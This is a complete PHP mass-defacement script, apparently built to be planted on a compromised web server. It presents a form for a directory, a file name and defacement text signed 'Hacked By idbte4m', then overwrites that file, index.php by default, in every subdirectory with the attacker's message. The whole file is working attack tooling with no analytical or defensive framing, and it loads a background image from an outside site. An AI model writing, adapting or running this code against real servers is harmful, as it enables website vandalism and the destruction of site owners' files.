<?php
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='gray'><font color=black'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "
<hr color='black'><font color='red'>[+] Main Directory:</font><br>
<input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='base_dir' value='".getcwd ()."'><br><br>";
echo "<font color='red'>[+] Mass File:</font><br><input cols='10' rows='10' type='text' style='color:lime;background-color:#000000' name='andela' value='index.php'><br>";
echo "<font color='red'>[+] Mass Defacement:</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked By idbte4m</textarea><br>";
echo "<input type='submit' value='Fire'></form></center>";
 
if (isset ($_POST['base_dir']))
{
        if (!file_exists ($_POST['base_dir']))
                die ($_POST['base_dir']." Not Found !<br>");
 
        if (!is_dir ($_POST['base_dir']))
                die ($_POST['base_dir']." Is Not A Directory !<br>");
 
        @chdir ($_POST['base_dir']) or die ("Cannot Open Directory");
 
        $files = @scandir ($_POST['base_dir']) or die ("Fuck u -_- <br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @filetype ($file) == "dir")
                {
                        $index = getcwd ()."/".$file."/".$_POST['andela'];
                        if (file_put_contents ($index, $_POST['index']))
                                echo "<br>$index";
                }
        endforeach;
}
 
?>